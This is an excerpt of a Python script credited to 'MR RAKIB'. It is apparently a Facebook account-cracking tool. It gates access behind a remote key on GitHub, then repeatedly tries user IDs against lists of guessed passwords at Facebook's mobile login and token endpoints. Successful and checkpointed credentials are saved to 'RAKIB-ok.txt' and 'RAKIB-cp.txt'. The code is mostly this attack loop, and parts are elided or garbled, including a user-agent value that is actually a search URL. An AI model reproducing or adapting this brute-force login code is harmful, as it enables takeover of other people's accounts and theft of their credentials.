...
'\x1b[1;91m'   Author      ||   MR RAKIB
'\x1b[1;92m'   Github      ||     MRRAKIB404CYBER
'\x1b[1;93m'   FB ID       ||    MR RAKIB
...
rsauser = ''https://www.google.com/search?q=Mozilla%2F5.0+%28Linux%3B+Android+%3B+Vivo+Y15SBuild%2FQKQ1.191215.002%3B+wv%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrome%2F91.0.4472.77+Mobile+Safari%2F537.36+%5BFB_IAB%2FFB4A%3BFBAV%2F325.0.0.36.170%3B%5D%27%2C+%27Mozilla%2F5.0+%28Linux%3B+Android+11%3B+Nokia+3.2+Build%2FRKQ1.200928.002%3B+wv%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrome%2F91.0.4472.120+Mobile+Safari%2F537.36+%5BFB_IAB%2FFB4A%3BFBAV%2F326.0.0.34.120%3B%5D%27&ei=7NYiY4X9JqOK9u8PlNyP8A0&oq=Mozilla%2F5.0+%28Linux%3B+Android+%3B+Vivo+Y15SBuild%2FQKQ1.191215.002%3B+wv%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrome%2F91.0.4472.77+Mobile+Safari%2F537.36+%5BFB_IAB%2FFB4A%3BFBAV%2F325.0.0.36.170%3B%5D%27%2C+%27Mozilla%2F5.0+%28Linux%3B+Android+11%3B+Nokia+3.2+Build%2FRKQ1.200928.002%3B+wv%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrome%2F91.0.4472.120+Mobile+Safari%2F537.36+%5BFB_IAB%2FFB4A%3BFBAV%2F326.0.0.34.120%3B%5D%27&gs_lcp=ChNtb2JpbGUtZ3dzLXdpei1zZXJwEANKBAhBGABQ9xlYyxtglCNoAHAAeACAAQCIAQCSAQCYAQCgAQHAAQE&sclient=mobile-gws-wiz-serp#sbfbu=1&pi=Mozilla/5.0%20(Linux;%20Android%20;%20Vivo%20Y15SBuild/QKQ1.191215.002;%20wv)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Version/4.0%20Chrome/91.0.4472.77%20Mobile%20Safari/537.36%20[FB_IAB/FB4A;FBAV/325.0.0.36.170;]',%20'
'Mozilla/5.0%20(Linux;%20Android%2011;%20Nokia%203.2%20Build/RKQ1.200928.002;%20wv)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Version/4.0%20Chrome/91.0.4472.120%20Mobile%20Safari/537.36%20[FB_IAB/FB4A;FBAV/326.0.0.34.120;]'
...
def main_apv():
    ...
    r1=requests.get("https://github.com/MarkZuke-404/rakib404/blob/main/Server%20text").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[RAKIB-OK] "+uid + " | " + pass1
                ok=open('RAKIB-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[RAKIB-CP] "+uid + " | " + pass2
                            cp=open('RAKIB-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[RAKIB-OK] "+uid + " | " + pass3
                                    cp=open('RAKIB-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[RAKIB-OK] "+uid + " | " + pass4
                                        ok=open('RAKIB-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[RAKIB-CP] "+uid + " | " + pass4
                                            cp=open('RAKIB-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                            ...
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[RAKIB-OK] "+uid + " | " + pass5
                                                ok=open('RAKIB-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[RAKIB-CP] "+uid + " | " + pass5
                                                    cp=open('RAKIB-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[RAKIB-OK] "+uid + " | " + pass2
                        ok=open('RAKIB-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[RAKIB-OK] "+uid + " | " + pass3
                                ok=open('RAKIB-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[RAKIB-CP] "+uid + " | " + pass5
                                                    cp=open('RAKIB-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;91m[RAKIB-OK] "+uid + " | " + pass1
                    cp=open('RAKIB-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            ...
                            if "access_token" in q:
                                ...
                                if "www.facebook.com" in q ["error_msg"]:
                                    print "\x1b[1;91m[RAKIB-CP] "+uid + " | " + pass3
                                    cp=open('RAKIB-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[1;91m[RAKIB-OK] "+uid + " | " + pass2
                            cp=open('RAKIB-ok.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
